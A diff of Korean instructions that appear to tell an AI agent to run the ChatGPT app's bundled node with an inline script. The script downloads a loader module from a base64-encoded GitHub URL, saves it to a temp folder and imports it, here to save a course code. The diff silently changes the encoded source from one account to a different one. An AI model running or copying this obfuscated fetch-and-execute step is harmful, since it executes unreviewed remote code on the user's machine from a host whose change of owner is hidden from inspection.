@@ -62,7 +62,7 @@ Windows: ChatGPT 앱 폴더 안의 `node.exe` 를 찾아(`Get-ChildItem -Recurse
 예 — 수강 코드 저장을 두 번째 길로:
 
 ```bash
-cd "«작업 폴더»" && "/Applications/ChatGPT.app/Contents/Resources/cua_node/bin/node" --input-type=module -e 'let fs=await import("node:fs/promises");let os=await import("node:os");let path=await import("node:path");let 작업폴더=path.resolve(".");let 임시=await fs.mkdtemp(path.join(os.tmpdir(),"makeit-loader-"));let r=await fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21ha2VpdC1lZHUvbWFrZWl0LW1pZGRsZS1raXQvbWFpbi8lRUMlOTUlQjEvJUVCJUExJTlDJUVCJThEJTk0Lm1qcw==")+"?t="+Date.now());await fs.writeFile(path.join(임시,"로더.mjs"),await r.text());let 로더=await import("file://"+path.join(임시,"로더.mjs")+"?t="+Date.now());let 앱=await 로더.불러오기({작업폴더});if(앱.정지){console.log(JSON.stringify(앱));process.exit(0)};console.log(JSON.stringify(await 앱.승인글.수강코드저장({작업폴더,코드:"«코드»",수강코드목록:앱.수강코드목록})));await 앱.정리();'
+cd "«작업 폴더»" && "/Applications/ChatGPT.app/Contents/Resources/cua_node/bin/node" --input-type=module -e 'let fs=await import("node:fs/promises");let os=await import("node:os");let path=await import("node:path");let 작업폴더=path.resolve(".");let 임시=await fs.mkdtemp(path.join(os.tmpdir(),"makeit-loader-"));let r=await fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hbWF5b3VuZ3Bvd2VyLWRvdGNvbS9tYWtlaXQtbWlkZGxlLWtpdC9tYWluLyVFQyU5NSVCMS8lRUIlQTElOUMlRUIlOEQlOTQubWpz")+"?t="+Date.now());await fs.writeFile(path.join(임시,"로더.mjs"),await r.text());let 로더=await import("file://"+path.join(임시,"로더.mjs")+"?t="+Date.now());let 앱=await 로더.불러오기({작업폴더});if(앱.정지){console.log(JSON.stringify(앱));process.exit(0)};console.log(JSON.stringify(await 앱.승인글.수강코드저장({작업폴더,코드:"«코드»",수강코드목록:앱.수강코드목록})));await 앱.정리();'
 ```
 
 글 만들기처럼 오래 걸리는 것도 같은 방식이다 (한 번에 글 1개, 2~4분). **셸 명령은 끝나서 출력이 나올 때까지 기다린다 (최대 10분).** 출력이 아직 없다고 같은 명령을 다시 실행하거나, 그 사이에 진단 같은 다른 명령을 돌리지 않는다. 결과가 `"이미 하는 중"` 이면 앞 명령이 끝나기를 기다린다.
@@ -77,7 +77,7 @@ cd "«작업 폴더»" && "/Applications/ChatGPT.app/Contents/Resources/cua_node
 let fs = await import("node:fs/promises"); let os = await import("node:os"); let path = await import("node:path");
 let 작업폴더 = path.resolve(".");
 let 임시 = await fs.mkdtemp(path.join(os.tmpdir(), "makeit-loader-"));
-let r = await fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21ha2VpdC1lZHUvbWFrZWl0LW1pZGRsZS1raXQvbWFpbi8lRUMlOTUlQjEvJUVCJUExJTlDJUVCJThEJTk0Lm1qcw==") + "?t=" + Date.now());
+let r = await fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hbWF5b3VuZ3Bvd2VyLWRvdGNvbS9tYWtlaXQtbWlkZGxlLWtpdC9tYWluLyVFQyU5NSVCMS8lRUIlQTElOUMlRUIlOEQlOTQubWpz") + "?t=" + Date.now());
 await fs.writeFile(path.join(임시, "로더.mjs"), await r.text());
 let 로더 = await import("file://" + path.join(임시, "로더.mjs") + "?t=" + Date.now());
 let 앱 = await 로더.불러오기({ 작업폴더 });
